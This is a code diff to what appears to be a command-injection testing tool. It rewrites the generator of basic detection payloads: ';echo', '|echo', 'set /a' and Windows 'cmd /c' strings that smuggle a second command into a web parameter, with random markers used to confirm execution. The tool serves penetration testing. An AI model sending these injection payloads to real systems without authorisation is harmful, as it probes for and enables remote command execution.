@@ -46,22 +46,37 @@ Checks if the testable parameter is exploitable.
 """
 
 """
-Heuristic basic checks payloads generator
+Generate fresh operands and markers per call; match the markers around the computed value to avoid false positives.
 """
 def basic_payload_generator():
+  rand_a = random.randint(1, 10000)
+  rand_b = random.randint(1, 10000)
+  calc_string = str(rand_a) + "%2B" + str(rand_b)
+  marker1 = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
+  marker2 = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
+
   suffix = ""
   if settings.USE_BACKTICKS:
     prefix = "expr "
   else:
     prefix = "("
     suffix = ")"
-  settings.BASIC_STRING = prefix + settings.CALC_STRING + suffix
-  settings.BASIC_COMMAND_INJECTION_PAYLOADS = [";echo " + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + 
-                                              "%26echo " + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + 
-                                              "|echo " + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + 
-                                              settings.RANDOM_STRING_GENERATOR,
-                                              "|set /a " + settings.BASIC_STRING + "%26set /a " + settings.BASIC_STRING
+  settings.BASIC_STRING = prefix + calc_string + suffix
+  alter_shell_basic_string = " -c \"print(int(" + calc_string + "))\""
+
+  settings.BASIC_COMMAND_INJECTION_PAYLOADS = [";echo " + marker1 + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + marker2 +
+                                              "%26echo " + marker1 + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + marker2 +
+                                              "|echo " + marker1 + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + marker2,
+                                              "|echo " + marker1 + "%26set /a " + settings.BASIC_STRING + "%26echo " + marker2 +
+                                              "%26echo " + marker1 + "%26set /a " + settings.BASIC_STRING + "%26echo " + marker2
                                               ]
+  settings.ALTER_SHELL_BASIC_COMMAND_INJECTION_PAYLOADS = [";echo " + marker1 + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + alter_shell_basic_string + settings.CMD_SUB_SUFFIX + marker2 +
+                                              "%26echo " + marker1 + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + alter_shell_basic_string + settings.CMD_SUB_SUFFIX + marker2 +
+                                              "|echo " + marker1 + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + alter_shell_basic_string + settings.CMD_SUB_SUFFIX + marker2,
+                                              "|echo " + marker1 + "%26for /f \"tokens=*\" %i in ('cmd /c " + settings.WIN_PYTHON_INTERPRETER + alter_shell_basic_string + "') do @set /p=%i" + settings.CMD_NUL + "%26echo " + marker2 +
+                                              "%26echo " + marker1 + "%26for /f \"tokens=*\" %i in ('cmd /c " + settings.WIN_PYTHON_INTERPRETER + alter_shell_basic_string + "') do @set /p=%i" + settings.CMD_NUL + "%26echo " + marker2
+                                              ]
+  settings.BASIC_COMMAND_INJECTION_RESULT = re.escape(marker1) + r"\s*" + re.escape(str(rand_a + rand_b)) + r"\s*" + re.escape(marker2)
 """
 Initializing basic level check status
 """
